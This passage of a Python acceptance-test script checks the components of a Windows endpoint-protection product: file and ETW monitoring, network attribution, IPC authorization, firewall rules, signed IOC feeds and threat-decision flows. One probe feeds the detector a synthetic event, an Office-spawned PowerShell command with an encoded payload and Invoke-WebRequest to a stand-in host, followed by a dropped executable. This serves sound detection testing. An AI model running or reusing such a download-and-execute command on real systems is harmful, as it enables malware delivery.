from __future__ import annotations

import argparse
import ctypes
import importlib.util
import json
import os
import platform
import socket
import sys
import tempfile
import time
from pathlib import Path

from sentinel.config import APP_VERSION, Settings
from sentinel.core.events import SecurityEvent
from sentinel.correlation import FileProcessCorrelator
from sentinel.correlation_engine import BehavioralCorrelationEngine
from sentinel.database import Database
from sentinel.etw_monitor import ETWMonitor
from sentinel.firewall_policy import FirewallManager, InMemoryFirewallBackend, MANAGED_FIREWALL_GROUP
from sentinel.ioc_denylist import IOCBundleError, SignedIOCVerifier
from sentinel.path_security import is_reparse_point
from sentinel.process_tree import ProcessTree
from sentinel.realtime import RealtimeMonitor
from sentinel.reputation import inspect_authenticode
from sentinel.network_monitor import NetworkMonitor
from sentinel.network_intelligence import NetworkReputationEngine
from sentinel.incident_engine import IncidentCorrelationEngine
from sentinel.response_engine import ResponseEngine
from sentinel.protection_protocol import ClientContext, build_request, PROTOCOL_VERSION
from sentinel.protection_service_core import ProtectionRuntime, ProtectionServiceCore, EngineInstanceGuard
from sentinel.protection_client import ProtectionServiceClient
from sentinel.protection_transport_windows import WindowsNamedPipeServer
from sentinel.scanner import StaticScanner
from sentinel.service_hardening import IntegrityVerifier, write_integrity_manifest
from tools.security_benchmark import make_corpus, scan_benchmark, scan_benchmark_median, realtime_benchmark
from tools.threat_decision_acceptance import run as run_threat_decision_acceptance
from tools.web_protection_acceptance import run as run_web_protection_acceptance
from tools.web_threat_response_acceptance import run as run_web_threat_response_acceptance
from tools.web_domain_trust_acceptance import run as run_web_domain_trust_acceptance
from tools.web_download_acceptance import run as run_web_download_acceptance
from tools.threat_package_acceptance import run as run_threat_package_acceptance
from tools.threat_channel_beta2_acceptance import run as run_threat_channel_beta2_acceptance
from tools.threat_channel_beta3_acceptance import run as run_threat_channel_beta3_acceptance
from tools.release_candidate_acceptance import run as run_release_candidate_acceptance
from tools.antispyware_acceptance import run as run_antispyware_acceptance
from tools.antispyware_remediation_acceptance import run as run_antispyware_remediation_acceptance
from tools.advanced_antimalware_acceptance import run as run_advanced_antimalware_acceptance
from tools.v090_release_candidate_acceptance import run as run_v090_release_candidate_acceptance
from tools.v010_web_deception_acceptance import run as run_v010_web_deception_acceptance


def _check(name: str, status: str, detail: str = "", *, critical: bool = False) -> dict:
    return {
        "name": name,
        "status": status,
        "critical": bool(critical),
        "detail": detail,
    }


def _module_check(module: str, *, critical: bool = False) -> dict:
    found = importlib.util.find_spec(module) is not None
    return _check(
        f"dependency:{module}",
        "pass" if found else "fail" if critical else "warn",
        "installed" if found else "not installed",
        critical=critical,
    )


def _is_admin() -> bool:
    if os.name != "nt":
        return False
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def _watchdog_probe(root: Path, db: Database) -> dict:
    settings = Settings.defaults()
    settings.monitored_dirs = [str(root)]
    settings.ransomware_dirs = []
    settings.ransomware_enabled = False
    settings.reputation_enabled = False
    monitor = RealtimeMonitor(settings, db=db)
    observed: list[str] = []
    def record(path: str):
        observed.append(str(path))

    # Acceptance only needs to prove that the native Observer delivered the
    # event. Avoid launching a scan worker from the probe itself.
    monitor._queue_scan = record
    started = monitor.start()
    if not started:
        return _check("watchdog-native-observer", "fail", "Observer did not start", critical=True)
    try:
        sample = root / "observer_probe.cmd"
        sample.write_text("@echo off\nrem BC Sentinel acceptance probe\n", encoding="utf-8")
        deadline = time.monotonic() + 5.0
        while time.monotonic() < deadline and not observed:
            time.sleep(0.05)
        if not observed:
            return _check(
                "watchdog-native-observer", "fail",
                "Observer started but no file event was received within 5 seconds",
                critical=True,
            )
        return _check(
            "watchdog-native-observer", "pass",
            f"received {len(observed)} event(s)", critical=True,
        )
    finally:
        monitor.stop()


def _etw_probe() -> dict:
    tree = ProcessTree()
    correlator = FileProcessCorrelator(process_tree=tree)
    monitor = ETWMonitor(tree, correlator)
    started = monitor.start()
    try:
        if not started:
            return _check("etw-process-file", "fail", monitor.error or "ETW did not start", critical=True)
        time.sleep(0.35)
        status = monitor.status()
        if not status.get("running"):
            return _check("etw-process-file", "fail", str(status), critical=True)
        return _check("etw-process-file", "pass", "ETW providers started", critical=True)
    finally:
        monitor.close()


def _authenticode_probe() -> dict:
    status, publisher = inspect_authenticode(Path(sys.executable))
    if status in {"Unsupported", "UnknownError", ""}:
        return _check(
            "authenticode-local", "fail",
            f"status={status or 'empty'} publisher={publisher or '-'}", critical=True,
        )
    return _check(
        "authenticode-local", "pass",
        f"status={status} publisher={publisher or '-'}", critical=True,
    )


def _reparse_probe(root: Path) -> dict:
    target = root / "junction_target"
    target.mkdir(exist_ok=True)
    link = root / "junction_probe"

    created = False
    detail = ""
    if os.name == "nt":
        # Directory junctions normally do not require Developer Mode and are a
        # useful real NTFS reparse-point acceptance check.
        import subprocess
        proc = subprocess.run(
            ["cmd.exe", "/d", "/c", "mklink", "/J", str(link), str(target)],
            capture_output=True,
            text=True,
            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
        )
        created = proc.returncode == 0 and link.exists()
        detail = (proc.stdout or proc.stderr or "").strip()
    else:
        try:
            link.symlink_to(target, target_is_directory=True)
            created = True
        except (OSError, NotImplementedError) as exc:
            detail = str(exc)

    if not created:
        return _check("reparse-junction-detection", "warn", f"probe unavailable: {detail}")
    try:
        if not is_reparse_point(link):
            return _check(
                "reparse-junction-detection", "fail",
                "created reparse object was not detected", critical=True,
            )
        return _check("reparse-junction-detection", "pass", "reparse object detected", critical=True)
    finally:
        try:
            if os.name == "nt":
                os.rmdir(link)
            else:
                link.unlink()
        except OSError:
            pass


def _network_probe(root: Path, db: Database) -> dict:
    observed=[]
    tree=ProcessTree()
    intelligence=NetworkReputationEngine(db)
    monitor=NetworkMonitor(
        callback=observed.append, interval=1.0, process_tree=tree, intelligence=intelligence
    )
    server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    accepted=None
    try:
        server.bind(("127.0.0.1",0))
        server.listen(1)
        port=server.getsockname()[1]
        if not monitor.start():
            return _check("network-process-attribution","fail","NetworkMonitor did not start",critical=True)
        client.connect(("127.0.0.1",port))
        accepted,_=server.accept()
        deadline=time.monotonic()+4.0
        while time.monotonic()<deadline:
            if any(e.pid==os.getpid() and int((e.data or {}).get("remote_port") or 0)==port for e in observed):
                event=next(e for e in observed if e.pid==os.getpid() and int((e.data or {}).get("remote_port") or 0)==port)
                endpoint_class=str((event.data or {}).get("endpoint_class") or "")
                if endpoint_class != "loopback":
                    return _check("network-process-attribution","fail",f"unexpected endpoint class: {endpoint_class}",critical=True)
                return _check("network-process-attribution","pass",f"PID {event.pid} -> 127.0.0.1:{port}; reputation={endpoint_class}",critical=True)
            time.sleep(.05)
        return _check("network-process-attribution","fail","psutil collector did not attribute the local TCP probe within 4 seconds",critical=True)
    finally:
        monitor.stop()
        for sock in (accepted,client,server):
            if sock is not None:
                try: sock.close()
                except OSError: pass



def _behavioral_correlation_probe() -> dict:
    """Synthetic, side-effect-free v0.4.1 sequence correlation probe."""
    engine = BehavioralCorrelationEngine(window_seconds=60)
    tree = ProcessTree()
    tree.observe(100, 1, "winword.exe", r"C:\\Program Files\\Microsoft Office\\WINWORD.EXE", create_time=1000)
    tree.observe(200, 100, "powershell.exe", r"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", cmdline="powershell.exe -EncodedCommand AAAA Invoke-WebRequest http://example.invalid/payload", create_time=1001)

    first = SecurityEvent(
        category="process", action="start", source="acceptance",
        pid=200, ppid=100, process_name="powershell.exe",
        process_path=r"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        data={"cmdline": "powershell.exe -EncodedCommand AAAA Invoke-WebRequest http://example.invalid/payload"},
        ts=10,
    )
    engine.assess(first, tree.ancestry(200))
    engine.assess(
        SecurityEvent(
            category="network", action="connect", source="acceptance",
            pid=200, ppid=100, process_name="powershell.exe",
            data={"remote_addr": "203.0.113.10", "remote_port": 443}, ts=11,
        ),
        tree.ancestry(200),
    )
    payload = r"C:\\Users\\Acceptance\\AppData\\Local\\Temp\\bcs-probe.exe"
    engine.assess(
        SecurityEvent(
            category="file", action="create", source="acceptance",
            pid=200, ppid=100, process_name="powershell.exe",
            path=payload, ts=12,
        ),
        tree.ancestry(200),
    )
    tree.observe(300, 200, "bcs-probe.exe", payload, create_time=1002)
    result = engine.assess(
        SecurityEvent(
            category="process", action="start", source="acceptance",
            pid=300, ppid=200, process_name="bcs-probe.exe",
            process_path=payload, ts=13,
        ),
        tree.ancestry(300),
    )

    expected = {"written_payload_execution", "download_to_exec"}
    if not expected.issubset(set(result.evidence_families)):
        return _check(
            "behavioral-correlation-v2", "fail",
            f"missing evidence families: {sorted(expected - set(result.evidence_families))}",
            critical=True,
        )
    if result.score_delta < 30 or not result.incident_id.startswith("BCI-"):
        return _check(
            "behavioral-correlation-v2", "fail",
            f"unexpected score/incident: +{result.score_delta} {result.incident_id}",
            critical=True,
        )
    return _check(
        "behavioral-correlation-v2", "pass",
        f"sequence correlated: +{result.score_delta}; severity={result.severity}; incident={result.incident_id}",
        critical=True,
    )

def _incident_response_probe(db: Database) -> dict:
    """Side-effect-free v0.5 incident + manual-response gate probe."""
    tree = ProcessTree()
    tree.observe(4242, 100, "probe.exe", r"C:\Users\Acceptance\AppData\Local\Temp\probe.exe", create_time=4242.5)
    engine = IncidentCorrelationEngine(db, tree, incident_window_seconds=60)

    class Correlation:
        score_delta = 24
        confidence = 0.84
        reasons = ["Synthetic multi-signal correlation"]
        incident_id = "BCI-ACCEPTV050"

    event = SecurityEvent(
        category="process",
        action="start",
        source="acceptance",
        score=40,
        pid=4242,
        ppid=100,
        process_name="probe.exe",
        process_path=r"C:\Users\Acceptance\AppData\Local\Temp\probe.exe",
        reasons=["Synthetic suspicious process"],
        data={"signature_status": "NotSigned"},
        ts=100.0,
    )
    incident = engine.ingest(event, correlation=Correlation(), ancestry=tree.ancestry(4242))
    if incident is None or incident.score < 50 or incident.incident_id != "BCI-ACCEPTV050":
        return _check(
            "incident-response-foundation",
            "fail",
            f"incident not created as expected: {incident}",
            critical=True,
        )

    class NoopQuarantine:
        def quarantine(self, *args, **kwargs):
            raise AssertionError("acceptance probe must never quarantine")

    response = ResponseEngine(db, NoopQuarantine())
    blocked = response.terminate_process(incident.to_dict(), approved=False)
    if blocked.status != "blocked":
        return _check(
            "incident-response-foundation",
            "fail",
            f"manual response gate did not fail closed: {blocked.status}",
            critical=True,
        )
    actions = db.incident_actions(incident.incident_id)
    if not actions or actions[0]["status"] != "blocked":
        return _check(
            "incident-response-foundation",
            "fail",
            "response audit trail was not persisted",
            critical=True,
        )
    return _check(
        "incident-response-foundation",
        "pass",
        f"incident={incident.incident_id}; score={incident.score}; manual action gated+audited",
        critical=True,
    )



def _protection_service_foundation_probe() -> list[dict]:
    """Side-effect-free v0.6 IPC, authorization and duplicate-engine probes."""
    secret = "a" * 64

    class Events:
        sequence = 0
        def since(self, seq, limit): return []

    class Runtime:
        def __init__(self):
            self.secret = secret
            self.events = Events()
            self.network = False
        def status(self):
            return {"service":"BCSentinelProtection","health":"HEALTHY","network":self.network,"protection_enabled":True}
        def set_network_collection(self, enabled): self.network=bool(enabled); return True
        def set_protection_enabled(self, enabled): return True
        def update_config(self, changes): return dict(changes)
        def attribute(self, path): return {"path":path}
        def process_chain(self, pid): return [{"pid":pid}]
        def incident(self, incident_id): return None
        def incidents(self, limit, min_score): return []
        def quarantine_items(self): return []

    core = ProtectionServiceCore(Runtime(), secret=secret)
    core._audit = lambda *args, **kwargs: None
    core._audit_broker = lambda *args, **kwargs: None
    admin = ClientContext(local=True, authenticated=True, is_admin=True, sid="S-1-5-32-544", session_id=1, transport="acceptance", process_id=200)
    standard = ClientContext(local=True, authenticated=True, is_admin=False, sid="S-1-5-21-acceptance", session_id=1, transport="acceptance", process_id=100)

    checks=[]
    malformed=core.dispatch_bytes(b"{not-json",standard)
    if malformed.get("ok") is not False or (malformed.get("error") or {}).get("code")!="malformed_json":
        checks.append(_check("protection-ipc-validation","fail",f"malformed request was not rejected: {malformed}",critical=True))
    else:
        checks.append(_check("protection-ipc-validation","pass","malformed JSON rejected before dispatch",critical=True))

    request=build_request("set_network_collection",secret,enabled=True)
    blocked=core.dispatch(request,standard)
    allowed=core.dispatch(request,admin)
    if blocked.get("ok") is not False or (blocked.get("error") or {}).get("code")!="admin_required" or not allowed.get("ok"):
        checks.append(_check("protection-privileged-gating","fail",f"blocked={blocked}; allowed={allowed}",critical=True))
    else:
        checks.append(_check("protection-privileged-gating","pass","privileged command requires authenticated administrator identity",critical=True))

    prepared = core.dispatch(
        build_request("prepare_privileged_action", secret, action="set_network_collection", payload={"enabled": True}),
        standard,
    )
    broker_ok = False
    broker_detail = str(prepared)
    if prepared.get("ok"):
        ticket_id = prepared.get("ticket_id")
        executed = core.dispatch(build_request("execute_privileged_ticket", secret, ticket_id=ticket_id), admin)
        result = core.dispatch(build_request("privileged_ticket_result", secret, ticket_id=ticket_id), standard)
        replay = core.dispatch(build_request("execute_privileged_ticket", secret, ticket_id=ticket_id), admin)
        broker_ok = bool(
            executed.get("ok") and executed.get("action_ok")
            and result.get("ok") and not result.get("pending")
            and replay.get("ok") is False
        )
        broker_detail = (
            f"prepared={prepared.get('ok')} executed={executed.get('action_ok')} "
            f"result={result.get('ok')} replay_blocked={replay.get('ok') is False}"
        )
    checks.append(_check(
        "protection-uac-broker-foundation",
        "pass" if broker_ok else "fail",
        broker_detail,
        critical=True,
    ))

    import importlib.util
    native = all(importlib.util.find_spec(x) is not None for x in ("win32pipe","win32security","win32service"))
    checks.append(_check(
        "protection-service-support",
        "pass" if native else "fail",
        "pywin32 named-pipe/service APIs available" if native else "required pywin32 APIs unavailable",
        critical=True,
    ))

    try:
        transport_source=(Path(__file__).resolve().parents[1] / "sentinel" / "protection_transport_windows.py").read_text(encoding="utf-8")
        identity_hardened=(
            "GetNamedPipeClientProcessId" in transport_source
            and "OpenProcessToken" in transport_source
            and "PIPE_REJECT_REMOTE_CLIENTS" in transport_source
        )
    except Exception:
        identity_hardened=False
    checks.append(_check(
        "protection-client-identity-path",
        "pass" if identity_hardened else "fail",
        "kernel-derived client PID/token fallback + remote-client rejection present" if identity_hardened else "named-pipe client identity fallback is incomplete",
        critical=True,
    ))

    try:
        hardening_source=(Path(__file__).resolve().parents[1] / "sentinel" / "service_hardening.py").read_text(encoding="utf-8")
        installer_source=(Path(__file__).resolve().parents[1] / "INSTALLA-SERVIZIO-PROTEZIONE.ps1").read_text(encoding="utf-8")
        core_source=(Path(__file__).resolve().parents[1] / "sentinel" / "protection_service_core.py").read_text(encoding="utf-8")
        hardening_ready=(
            "IntegrityVerifier" in hardening_source
            and "AuditChainWriter" in hardening_source
            and "windows_acl_posture" in hardening_source
            and 'TRUSTED_WRITE_SIDS = {' in hardening_source
            and '"S-1-5-18"' in hardening_source
            and '"S-1-5-32-544"' in hardening_source
            and "windows_service_posture" in hardening_source
            and "$env:ProgramFiles" in installer_source
            and "protection-integrity.key" in installer_source
            and "Repair-TreeAclForAdministrators" in installer_source
            and "Repair-KnownProgramDataStateFiles" in installer_source
            and "ProgramData Protection legacy state" in installer_source
            and "Show-ServiceStartDiagnostics" in installer_source
            and "ensure_integrity_key" in core_source
            and "TRANSIENT_CONNECT_ERRORS" in transport_source
        )
    except Exception:
        hardening_ready=False
    checks.append(_check(
        "protection-hardening-foundation",
        "pass" if hardening_ready else "fail",
        "Program Files deployment + split integrity key + manifest/ACL/SCM/audit hardening present" if hardening_ready else "v0.6.1 hardening foundation is incomplete",
        critical=True,
    ))

    try:
        project = Path(__file__).resolve().parents[1]
        broker_source = (project / "sentinel" / "privileged_broker.py").read_text(encoding="utf-8")
        broker_entry = (project / "sentinel" / "privileged_broker_windows.py").read_text(encoding="utf-8")
        update_source = (project / "sentinel" / "service_update.py").read_text(encoding="utf-8")
        build_source = (project / "BUILD-SERVIZIO-PROTEZIONE.ps1").read_text(encoding="utf-8-sig")
        update_script = (project / "AGGIORNA-RIPARA-SERVIZIO-PROTEZIONE.ps1").read_text(encoding="utf-8")
        v062_ready = (
            "PrivilegeTicketStore" in broker_source
            and "BROKER_TICKET_TTL_SECONDS" in broker_source
            and "--ticket" in broker_entry
            and "BC-Sentinel-Broker" in build_source
            and "validate_update_source" in update_source
            and "anti-downgrade" in update_source
            and "tools.service_update rollback" in update_script
        )
    except Exception:
        v062_ready = False
    checks.append(_check(
        "protection-v062-broker-update-foundation",
        "pass" if v062_ready else "fail",
        "one-action UAC broker + anti-replay ticketing + transactional upgrade/repair foundation present" if v062_ready else "v0.6.2 broker/update foundation incomplete",
        critical=True,
    ))

    if os.name == "nt" and native:
        probe_name=rf"\\.\pipe\BCSentinelAcceptance-{os.getpid()}-{int(time.time()*1000)}"
        pipe_server=WindowsNamedPipeServer(core,pipe_name=probe_name)
        try:
            pipe_server.prepare()
            checks.append(_check(
                "protection-pipe-create",
                "pass" if pipe_server.ready else "fail",
                "secured named-pipe instance created synchronously" if pipe_server.ready else "named pipe did not reach ready state",
                critical=True,
            ))
        except Exception as exc:
            checks.append(_check("protection-pipe-create","fail",f"{type(exc).__name__}: {exc}",critical=True))
        finally:
            pipe_server.close_prepared()

    guard_name=f"BCSentinelAcceptance-{os.getpid()}-{int(time.time()*1000)}"
    first=EngineInstanceGuard(guard_name); second=EngineInstanceGuard(guard_name)
    a=first.acquire(); b=second.acquire()
    first.release(); second.release()
    if not a or b:
        checks.append(_check("duplicate-engine-guard","fail",f"first={a} second={b}",critical=True))
    else:
        checks.append(_check("duplicate-engine-guard","pass","second protection-engine owner was rejected",critical=True))
    return checks


def _firewall_foundation_probe() -> dict:
    """Side-effect-free v0.7 firewall policy + broker authorization probe."""
    secret = "7" * 64

    class Events:
        sequence = 0
        def since(self, seq, limit): return []

    class Audit:
        def append(self, record): pass

    class Runtime:
        def __init__(self):
            self.secret = secret
            self.events = Events()
            self.audit_writer = Audit()
            self.firewall = FirewallManager(InMemoryFirewallBackend())
            self._hardening_status = {"ok": True, "mode": "development"}
        def status(self):
            return {"service": "BCSentinelProtection", "health": "HEALTHY", "protection_enabled": True, "network": True, "firewall": self.firewall.status()}
        def firewall_status(self): return self.firewall.status()
        def firewall_rules(self, limit=200): return self.firewall.list_rules(limit)
        def firewall_block_remote(self, p):
            return self.firewall.block_remote(
                remote_address=p["remote_address"], direction=p["direction"], protocol=p["protocol"],
                remote_port=p.get("remote_port"), application_path=p.get("application_path", ""),
                reason=p.get("reason", ""), incident_id=p.get("incident_id", ""),
            )
        def firewall_remove_rule(self, rule_id): return self.firewall.remove_rule(rule_id)
        def firewall_set_managed_enabled(self, enabled): return self.firewall.set_managed_enabled(enabled)

    core = ProtectionServiceCore(Runtime(), secret=secret)
    core._audit = lambda *args, **kwargs: None
    core._audit_broker = lambda *args, **kwargs: None
    standard = ClientContext(local=True, authenticated=True, is_admin=False, sid="S-1-5-21-700", session_id=1, transport="acceptance", process_id=700)
    admin = ClientContext(local=True, authenticated=True, is_admin=True, sid="S-1-5-21-700", session_id=1, transport="acceptance", process_id=701)

    direct = core.dispatch(build_request(
        "firewall_block_remote", secret, remote_address="192.0.2.77", direction="outbound",
        protocol="any", reason="acceptance", approved=True,
    ), standard)
    if (direct.get("error") or {}).get("code") != "admin_required":
        return _check("firewall-v070-foundation", "fail", f"standard direct gate failed: {direct}", critical=True)

    prepared = core.dispatch(build_request(
        "prepare_privileged_action", secret, action="firewall_block_remote",
        payload={"remote_address": "192.0.2.77", "direction": "outbound", "protocol": "any", "reason": "acceptance", "approved": True},
    ), standard)
    if not prepared.get("ok"):
        return _check("firewall-v070-foundation", "fail", f"ticket prepare failed: {prepared}", critical=True)
    executed = core.dispatch(build_request("execute_privileged_ticket", secret, ticket_id=prepared["ticket_id"]), admin)
    if not executed.get("ok") or not executed.get("action_ok"):
        return _check("firewall-v070-foundation", "fail", f"broker firewall execution failed: {executed}", critical=True)
    inner = executed.get("action_result") or {}
    rule = inner.get("rule") or {}
    rule_id = str(rule.get("rule_id") or "")
    if not rule_id.startswith("BCSF-"):
        return _check("firewall-v070-foundation", "fail", f"invalid managed rule: {rule}", critical=True)
    removed = core.dispatch(build_request("firewall_remove_rule", secret, rule_id=rule_id, approved=True), admin)
    status = core.runtime.firewall_status()
    if not removed.get("ok") or status.get("managed_rules") != 0:
        return _check("firewall-v070-foundation", "fail", f"cleanup/status failed: removed={removed}; status={status}", critical=True)
    return _check(
        "firewall-v070-foundation", "pass",
        f"block-only policy + admin gate + broker path + cleanup; group={MANAGED_FIREWALL_GROUP}",
        critical=True,
    )


def _firewall_v071_drift_probe() -> dict:
    """Side-effect-free v0.7.1 desired-state drift + reconciliation probe."""
    secret = "8" * 64

    class Events:
        sequence = 0
        def since(self, seq, limit): return []

    class Audit:
        def append(self, record): pass

    class Runtime:
        def __init__(self):
            self.secret = secret
            self.events = Events()
            self.audit_writer = Audit()
            self.firewall = FirewallManager(InMemoryFirewallBackend())
            self._hardening_status = {"ok": True, "mode": "development"}
        def status(self): return {"service": "BCSentinelProtection", "health": "HEALTHY", "firewall": self.firewall.status()}
        def firewall_status(self): return self.firewall.status()
        def firewall_rules(self, limit=200): return self.firewall.list_rules(limit)
        def firewall_drift(self): return self.firewall.drift_report()
        def firewall_reconcile(self, *, approved): return self.firewall.reconcile_drift(approved=approved)
        def firewall_block_remote(self, p):
            return self.firewall.block_remote(
                remote_address=p["remote_address"], direction=p["direction"], protocol=p["protocol"],
                remote_port=p.get("remote_port"), application_path=p.get("application_path", ""),
                reason=p.get("reason", ""), incident_id=p.get("incident_id", ""),
            )
        def firewall_remove_rule(self, rule_id): return self.firewall.remove_rule(rule_id)
        def firewall_set_managed_enabled(self, enabled): return self.firewall.set_managed_enabled(enabled)

    core = ProtectionServiceCore(Runtime(), secret=secret)
    core._audit = lambda *args, **kwargs: None
    core._audit_broker = lambda *args, **kwargs: None
    standard = ClientContext(local=True, authenticated=True, is_admin=False, sid="S-1-5-21-710", session_id=1, transport="acceptance", process_id=710)
    admin = ClientContext(local=True, authenticated=True, is_admin=True, sid="S-1-5-21-710", session_id=1, transport="acceptance", process_id=711)

    added = core.dispatch(build_request(
        "firewall_block_remote", secret, remote_address="192.0.2.88", direction="outbound",
        protocol="any", reason="v071 drift probe", approved=True,
    ), admin)
    if not added.get("ok"):
        return _check("firewall-v071-drift", "fail", f"setup add failed: {added}", critical=True)
    rule_id = str((added.get("rule") or {}).get("rule_id") or "")
    core.runtime.firewall.backend.remove_rule(rule_id)  # external mutation simulation; desired state remains.

    drift = core.dispatch(build_request("firewall_drift", secret), standard)
    issues = (drift.get("drift") or {}).get("issues") or []
    if not drift.get("ok") or not any(x.get("type") == "missing" and x.get("rule_id") == rule_id for x in issues):
        return _check("firewall-v071-drift", "fail", f"missing drift not detected: {drift}", critical=True)

    direct = core.dispatch(build_request("firewall_reconcile", secret, approved=True), standard)
    if (direct.get("error") or {}).get("code") != "admin_required":
        return _check("firewall-v071-drift", "fail", f"standard reconciliation gate failed: {direct}", critical=True)

    repaired = core.dispatch(build_request("firewall_reconcile", secret, approved=True), admin)
    after = core.dispatch(build_request("firewall_drift", secret), standard)
    if not repaired.get("ok") or not (repaired.get("reconciliation") or {}).get("ok") or not (after.get("drift") or {}).get("ok"):
        return _check("firewall-v071-drift", "fail", f"reconciliation failed: repaired={repaired}; after={after}", critical=True)

    cleanup = core.dispatch(build_request("firewall_remove_rule", secret, rule_id=rule_id, approved=True), admin)
    if not cleanup.get("ok"):
        return _check("firewall-v071-drift", "fail", f"cleanup failed: {cleanup}", critical=True)
    return _check(
        "firewall-v071-drift", "pass",
        "desired state detected external removal; standard user could inspect; explicit privileged reconciliation restored only the owned rule",
        critical=True,
    )


def _v071_beta2_security_probe() -> list[dict]:
    """Side-effect-free beta.2 rate-limit/conflict/Threat Decision gates."""
    checks: list[dict] = []
    secret = "9" * 64

    class Events:
        sequence = 0
        def since(self, seq, limit): return []

    class Runtime:
        def __init__(self):
            self.secret = secret
            self.events = Events()
            self.firewall = FirewallManager(InMemoryFirewallBackend())
        def status(self): return {"health": "HEALTHY", "firewall": self.firewall.status()}
        def firewall_status(self): return self.firewall.status()
        def firewall_drift(self): return self.firewall.drift_report()
        def firewall_conflicts(self): return self.firewall.policy_conflict_report()
        def firewall_reconcile(self, *, approved): return self.firewall.reconcile_drift(approved=approved)
        def threat_file_action(self, payload): return {"action": payload["action"], "status": "success"}

    core = ProtectionServiceCore(Runtime(), secret=secret)
    core._audit = lambda *args, **kwargs: None
    core._audit_broker = lambda *args, **kwargs: None
    admin = ClientContext(local=True, authenticated=True, is_admin=True, sid="S-1-5-21-712", session_id=1, transport="acceptance", process_id=712)

    responses = [core.dispatch(build_request("firewall_reconcile", secret, approved=False), admin) for _ in range(7)]
    rate_ok = (
        all((row.get("error") or {}).get("code") == "approval_required" for row in responses[:6])
        and (responses[6].get("error") or {}).get("code") == "rate_limited"
    )
    checks.append(_check(
        "protection-v071-beta2-rate-limit",
        "pass" if rate_ok else "fail",
        "privileged firewall burst bounded without weakening explicit approval" if rate_ok else str(responses[-2:]),
        critical=True,
    ))

    backend = InMemoryFirewallBackend()
    manager = FirewallManager(backend)
    rule = manager.block_remote(remote_address="192.0.2.99", direction="outbound", protocol="any")
    backend.policy_conflicts.append({
        "type": "external_allow_overlap",
        "rule_id": rule["rule_id"],
        "effect": "advisory_only_windows_block_precedence_retained",
    })
    conflict = manager.policy_conflict_report()
    conflict_ok = bool(conflict.get("ok")) and conflict.get("blocking_count") == 0 and conflict.get("advisory_count") == 1
    checks.append(_check(
        "firewall-v071-beta2-conflict-engine",
        "pass" if conflict_ok else "fail",
        "external ALLOW overlap is read-only advisory; no global/firewall policy mutation" if conflict_ok else str(conflict),
        critical=True,
    ))

    threat = run_threat_decision_acceptance()
    checks.append(_check(
        "threat-decision-v071-beta2",
        "pass" if threat.get("passed") else "fail",
        "harmless detection -> quarantine/restore/delete/keep-once/allow-hash acceptance passed" if threat.get("passed") else str(threat),
        critical=True,
    ))
    return checks


def _v071_beta3_security_probe() -> list[dict]:
    """Side-effect-free beta.3 signed IOC, bounded containment and Inbox gates."""
    checks: list[dict] = []
    fixture_root = Path(__file__).resolve().parents[1] / "rules"
    bundle = json.loads((fixture_root / "ioc-denylist-v1.safe-fixture.json").read_text(encoding="utf-8"))
    signature = (fixture_root / "ioc-denylist-v1.safe-fixture.sig").read_text(encoding="utf-8").strip()
    verifier = SignedIOCVerifier()
    try:
        verified = verifier.verify(bundle, signature)
        tampered = json.loads(json.dumps(bundle))
        tampered["bundle_id"] = str(tampered["bundle_id"]) + ".tampered"
        tamper_rejected = False
        try:
            verifier.verify(tampered, signature)
        except IOCBundleError:
            tamper_rejected = True
        ioc_ok = verified.sequence == 1 and len(verified.entries) == 2 and tamper_rejected
    except Exception as exc:
        verified = None
        ioc_ok = False
        tamper_rejected = False
        ioc_error = str(exc)
    checks.append(_check(
        "ioc-v071-beta3-signed-feed",
        "pass" if ioc_ok else "fail",
        "Ed25519 trust anchor verified harmless feed and rejected payload tampering" if ioc_ok else locals().get("ioc_error", "signed IOC gate failed"),
        critical=True,
    ))

    containment_ok = False
    inbox_ok = False
    detail = ""
    if verified is not None:
        try:
            with tempfile.TemporaryDirectory(prefix="bcs-v071-beta3-") as raw:
                root = Path(raw)
                db = Database(root / "state.sqlite")
                db.install_ioc_bundle(verified)
                runtime = ProtectionRuntime.__new__(ProtectionRuntime)
                runtime.db = db
                runtime.firewall = FirewallManager(InMemoryFirewallBackend(), desired_state_store=db)
                runtime.ioc_verifier = verifier
                lease = runtime.create_containment_lease({
                    "remote_address": "192.0.2.240", "ttl_seconds": 60,
                    "reason": "beta3 side-effect-free acceptance", "incident_id": "", "approved": True,
                })
                lease_id = str(lease.get("lease_id") or "")
                rule_id = str(lease.get("rule_id") or "")
                active = runtime.containment_leases()
                released = runtime.release_containment_lease(lease_id, approved=True)
                denied = False
                try:
                    runtime.create_containment_lease({
                        "remote_address": "198.51.100.44", "ttl_seconds": 60,
                        "reason": "must fail", "incident_id": "", "approved": True,
                    })
                except PermissionError:
                    denied = True
                containment_ok = bool(
                    lease_id and rule_id
                    and any(str(x.get("lease_id") or "") == lease_id for x in active)
                    and released.get("status") == "released"
                    and not runtime.firewall.list_rules(100)
                    and denied
                )

                digest = "a" * 64
                db.add_detection("C:/Temp/pending.bin", digest, 92, "HIGH", '["beta3 inbox"]', "logged", dedupe_minutes=0)
                pending_before = runtime.pending_threats()
                runtime.acknowledge_threat_decision(digest, "allowed_once", "side-effect-free inbox acceptance")
                pending_after = runtime.pending_threats()
                ui_source = (Path(__file__).resolve().parents[1] / "app" / "ui" / "main_window.py").read_text(encoding="utf-8")
                inbox_ok = bool(
                    any(str(x.get("sha256") or "") == digest for x in pending_before)
                    and not any(str(x.get("sha256") or "") == digest for x in pending_after)
                    and "Security Center Inbox" in ui_source
                    and "Gestisci minaccia" in ui_source
                    and "pending_threats" in ui_source
                )
        except Exception as exc:
            detail = str(exc)
    checks.append(_check(
        "containment-v071-beta3-lease-safety",
        "pass" if containment_ok else "fail",
        "signed IOC qualified a temporary BC-owned BLOCK lease; explicit release restored baseline; unqualified target rejected" if containment_ok else detail or "containment gate failed",
        critical=True,
    ))
    checks.append(_check(
        "security-center-v071-beta3-inbox",
        "pass" if inbox_ok else "fail",
        "HIGH/CRITICAL pending decision persisted until an explicit decision acknowledgement; UI Inbox route present" if inbox_ok else detail or "Security Center Inbox gate failed",
        critical=True,
    ))
    return checks


def _v072_beta1_web_protection_probe() -> dict:
    result = run_web_protection_acceptance(service_live=False)
    ok = bool(result.get("passed"))
    safety = result.get("safety") or {}
    dns = result.get("dns_correlation") or {}
